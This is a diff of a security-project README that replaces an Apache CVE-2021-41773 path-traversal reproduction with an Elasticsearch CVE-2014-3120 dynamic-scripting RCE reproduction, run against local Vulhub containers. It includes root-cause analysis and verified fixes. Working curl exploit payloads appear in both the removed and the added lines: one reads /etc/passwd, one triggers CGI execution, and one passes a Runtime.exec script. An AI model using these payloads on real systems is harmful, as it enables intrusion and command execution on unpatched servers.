@@ -2,7 +2,7 @@
 
 A small, deliberately hardened REST API in Python/Flask, a CI pipeline that runs
 tests + SAST + SCA on every push, and a reproducible analysis of a real CVE
-(**CVE-2021-41773**, Apache HTTP Server 2.4.49 path traversal) including the fix
+(**CVE-2014-3120**, Elasticsearch 1.1.1 dynamic-scripting RCE) including the fix
 and the proof that the fix works.
 
 ---
@@ -224,127 +224,129 @@ pip-audit:  No known vulnerabilities found
 
 ---
 
-## 6. Reproducing CVE-2021-41773 (Vulhub)
+## 6. Reproducing CVE-2014-3120 (Vulhub)
 
-Selected vulnerability: **CVE-2021-41773 — path traversal / file disclosure and,
-with CGI enabled, remote code execution in Apache HTTP Server 2.4.49.**
-CVSS 3.1: 7.5 (HIGH), CWE-22 (path traversal). Environment taken from
-`vulhub/httpd/CVE-2021-41773` and kept in `vulnerability/vulnerable/`.
+Selected vulnerability: **CVE-2014-3120 — remote code execution through
+Elasticsearch's dynamic scripting**, unauthenticated in the default
+configuration of Elasticsearch < 1.2.0. CVSS 3.1: 8.1 (HIGH), CWE-284; it is on
+the CISA KEV list (added 2022-03-25) because it is exploited in the wild.
+Environment taken from `vulhub/elasticsearch/CVE-2014-3120` and kept in
+`vulnerability/vulnerable/`.
 
 Prerequisite: Docker with Docker Compose.
 
 ```bash
 cd vulnerability/vulnerable
-docker compose up --build -d
+docker compose up -d
+curl -s http://127.0.0.1:9200/          # "number" : "1.1.1"
 ```
 
-### Attack 1 — read a file outside the document root
+### Attack 1 — put one document in an index
 
 ```bash
-curl -v --path-as-is \
-  http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+curl -s -XPUT 'http://127.0.0.1:9200/blog/post/1' \
+     -H 'Content-Type: application/json' -d '{"title":"hello"}'
+curl -s -XPOST 'http://127.0.0.1:9200/blog/_refresh'
 ```
 
-Expected: `HTTP/1.1 200 OK` and `root:x:0:0:root:/root:/bin/bash` — the web
-root was escaped even though `/etc/passwd` is four levels above it.
-
-### Attack 2 — escalate to code execution through CGI
+### Attack 2 — make the search API run Java
 
 ```bash
-curl -v --data "echo;id" \
-  'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
+curl -s -XPOST 'http://127.0.0.1:9200/_search' \
+  -H 'Content-Type: application/json' -d '{
+    "size":1,"query":{"match_all":{}},
+    "script_fields":{"pwn":{"script":"java.lang.Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",\"id > /tmp/pwned.txt\"})"}}
+  }'
 ```
 
-Expected: `uid=1(daemon) gid=1(daemon)` — an arbitrary shell command ran as the
-Apache worker user.
+Expected: `HTTP 200` and, inside the hit list, `"pwn":["java.lang.UNIXProcess@…"]`
+— the string form of a running process. The command itself is visible in the
+container:
 
-`vulnerability/run_demo.ps1` automates both attacks, asserts the expected
-results, and writes the whole transcript to `reports/cve-41773-*.log`.
+```bash
+docker compose exec -T es cat /tmp/pwned.txt
+# uid=0(root) gid=0(root) groups=0(root)
+```
+
+`vulnerability/run_demo.ps1 -Phase all` automates all three scenarios, asserts
+the expected outcome of each and writes `reports/cve-2014-3120-all.log`.
 
 ---
 
 ## 7. Root cause analysis
 
-Apache 2.4.49 replaced the old request-path cleanup (`ap_getparents`,
-`ap_no2slash`) with a single `ap_normalize_path()` pass. The new function walks
-the path segment by segment and rejects a segment that is exactly `..`, which
-looks correct — but it decodes `%2e` at a different point than it validates the
-segment.
+Elasticsearch exposes a scripting subsystem: a search request may carry a
+script, and the node compiles and evaluates it **inside its own JVM**. This is a
+feature — `script_fields` computes values at query time — but before 1.2 the
+default policy left it open to anyone who could reach the port:
 
-The bypass is a segment written as `.%2e`:
+1. **`script.disable_dynamic` defaulted to `false`.** Every script arriving in a
+   request body was compiled and executed. The only thing between an attacker
+   and `Runtime.getRuntime()` was the JSON parser.
+2. **No sandbox.** In 1.0/1.1 the MVEL expression is evaluated with full Java
+   reflection, so `java.lang.Runtime` is reachable directly. A scripting engine
+   without a class filter is `eval()` for Java.
+3. **No authentication.** Elasticsearch 1.x had no users, roles or TLS, and the
+   image binds `0.0.0.0`. The CVSS vector says `PR:L` because the vendor treats
+   the API as privileged; on the network there is no credential at all, which is
+   why this is effectively unauthenticated RCE.
+4. **Blast radius.** The node runs as root in this image, so the first command
+   is already root-level: read the data directory, reach the network, or abuse
+   the heap.
 
-1. During the traversal check the segment text is `.%2e`, which is **not**
-   equal to `..`, so the "cannot go above the root" check is skipped.
-2. The percent-decoding step then turns `.%2e` into `..`.
-3. `ap_core_translate()` joins the (now decoded) path to `DocumentRoot` and
-   resolves it, so the kernel walks out of the web root.
+The defect is therefore an **access-control failure around a dangerous
+capability** (CWE-284): code evaluation was treated as an ordinary data field.
+Every later fix is a way of taking that capability away from the client.
 
-That is why the payload needs the odd `.%2e/` spelling instead of a plain `../`:
-the plain form is caught by the check, the encoded form is not. It is a
-**logic/ordering error** (validate-before-normalise), not a missing check —
-there *is* a check, it just runs on a different string than the one that is
-finally used.
-
-Two configuration choices turn a file-disclosure bug into an RCE:
-
-* `<Directory />` was changed to `Require all granted` (the upstream default is
-  `Require all denied`), so paths outside `DocumentRoot` are served at all.
-* `mod_cgi`/`mod_cgid` are loaded, so `/bin/sh` reached through the traversal is
-  executed rather than downloaded.
-
-Full write-up, including the prerequisites and the diff of the fix, is in
-[`vulnerability/README.md`](vulnerability/README.md).
+Full write-up: [`vulnerability/README.md`](vulnerability/README.md).
 
 ---
 
 ## 8. The fix and the proof
 
-`vulnerability/fixed/` rebuilds the service on **httpd 2.4.51** (2.4.50 was an
-incomplete fix that still allowed a variant of the bypass) with a hardened
-config:
+Three layers, weakest to strongest:
 
-1. **Patched binary** — 2.4.51 normalises and validates in the correct order, so
-   `.%2e` cannot smuggle a `..` past the check.
-2. **`<Directory /> Require all denied`** restored — even a future traversal bug
-   cannot read `/etc/passwd`, because the default policy denies it.
-3. **CGI disabled** — this service serves static files only, so a file
-   disclosure can never be escalated to command execution.
+1. **Configuration (mitigation)** — `script.disable_dynamic: true` on the
+   vulnerable 1.1.1 image (`vulnerability/hardened/`). The node refuses to
+   compile scripts from a request; the search returns
+   `ScriptException[dynamic scripting disabled]`.
+2. **Patch (upgrade)** — Elasticsearch 1.4.4 (`vulnerability/fixed/`), where
+   dynamic scripting has been off by default since 1.2 and a Groovy sandbox
+   filters classes.
+3. **Design** — do not expose the scripting API to clients at all: network ACL,
+   a proxy that rejects `script`/`source` fields, or Elasticsearch ≥ 2.0 where
+   dynamic scripting was removed.
 
-Verification (same payloads, fixed environment):
+```dockerfile
+# hardened/
+FROM vulhub/elasticsearch:1.1.1
+RUN echo "script.disable_dynamic: true" >> /usr/share/elasticsearch/config/elasticsearch.yml
 
-```bash
-cd vulnerability/fixed
-docker compose up --build -d
-
-# both attacks must now fail
-curl --path-as-is -i http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-curl --path-as-is -i --data "echo;id" 'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
-# regression: normal service must still work
-curl -s -i http://127.0.0.1:8080/
+# fixed/
+FROM vulhub/elasticsearch:1.4.4
 ```
 
 ### Measured result
 
-| Scenario | Traversal | CGI execution | `GET /` |
-| --- | --- | --- | --- |
-| 2.4.49 + Vulhub config (`vulnerable/`) | **200** + `root:x:0:0` | **200** + `uid=1(daemon)` | 200 |
-| 2.4.49 + default config (`defence-in-depth/`) | **403** | **403** | 200 |
-| 2.4.51 + hardening (`fixed/`) | **400** | **400** | 200 |
+| Scenario | `version.number` | Attack | `/tmp/pwned.txt` | Normal search |
+| --- | --- | --- | --- | --- |
+| `vulnerable/` — dynamic scripting on | 1.1.1 | **200**, `java.lang.UNIXProcess@…` | **`uid=0(root)`** | 1 hit |
+| `hardened/` — `script.disable_dynamic: true` | 1.1.1 | **400**, `dynamic scripting disabled` | absent | 1 hit |
+| `fixed/` — upgraded | 1.4.4 | **400**, `dynamic scripting for [groovy] disabled` | absent | 1 hit |
 
-After the fix both attacks are rejected, no `root:x:0:0` and no `uid=` appears
-in any response, and `/` still returns `200 OK` with `It works!`.
+After the fix the attack is rejected, nothing is executed, and the same
+document is still searchable — the regression check proves the remediation did
+not break the service.
 
-The middle row isolates the configuration layer: the vulnerable *code* is still
-there, yet the attack fails. The 400 in the last row comes from the patched
-normaliser itself — the request never reaches the authorisation phase, which is
-what a genuine code fix looks like.
+A nuance worth keeping: **1.4.4 is not the end of the story.** It fixed this
+CVE, but in 2015 the 1.4.x sandbox was bypassed again (CVE-2015-1427, Groovy
+sandbox escape), and 1.4.4 is still inside that affected range. That is why the
+strongest layer above is the design one: "no client-supplied scripts" survives
+the next clever expression, while a sandbox has to be perfect every time.
 
 ```powershell
 powershell -NoProfile -File vulnerability\run_demo.ps1 -Phase all
 ```
-
-runs all three scenarios, asserts the expected outcome of each and writes
-`reports/cve-41773-all.log`.
 
 ---
 
@@ -364,9 +366,9 @@ work1-secure-api/
 ├── .github/workflows/ci.yml
 ├── vulnerability/
 │   ├── README.md          # CVE analysis, step by step
-│   ├── vulnerable/        # httpd 2.4.49 + CGI, from vulhub
-│   ├── defence-in-depth/  # 2.4.49 + default config (isolates the config layer)
-│   ├── fixed/             # httpd 2.4.51 + hardening
+│   ├── vulnerable/        # Elasticsearch 1.1.1, dynamic scripting on
+│   ├── hardened/          # 1.1.1 + script.disable_dynamic (isolates the config layer)
+│   ├── fixed/             # 1.4.4, dynamic scripting off by default
 │   ├── run_demo.ps1       # three-phase attack -> verify, writes reports/*.log
 │   └── run_demo.sh
 ├── scripts/live_demo.ps1  # curl walkthrough of the API
@@ -382,10 +384,7 @@ work1-secure-api/
 | File | Content |
 | --- | --- |
 | `reports/curl-transcript.txt` | 9 curl exchanges: 401 without token, JWT issued, 401 on bad password, 200 with token, SQLi payload → 0 rows, XSS escaped, 401 on garbage token, security headers |
-| `reports/cve-41773-phase1.log` | 2.4.49: traversal returns `200` + `/etc/passwd`, CGI returns `200` + `uid=1(daemon)` |
-| `reports/cve-41773-hardened-config.log` | 2.4.49 + default config: both attacks `403`, `/` still `200` |
-| `reports/cve-41773-phase2.log` | 2.4.51: both attacks `400`, `/` still `200` |
-| `reports/cve-41773-all.log` | `run_demo.ps1 -Phase all` verdicts for the three scenarios |
+| `reports/cve-2014-3120-all.log` | `run_demo.ps1 -Phase all`: RCE succeeds on 1.1.1 (`uid=0(root)`), is rejected on the hardened image and on 1.4.4, normal search still works in all three |
 | `reports/junit.xml` | pytest results |
 | `reports/bandit.txt` / `.json` | bandit report (no issues) |
 | `reports/pip-audit.json` | dependency audit (no known vulnerabilities) |
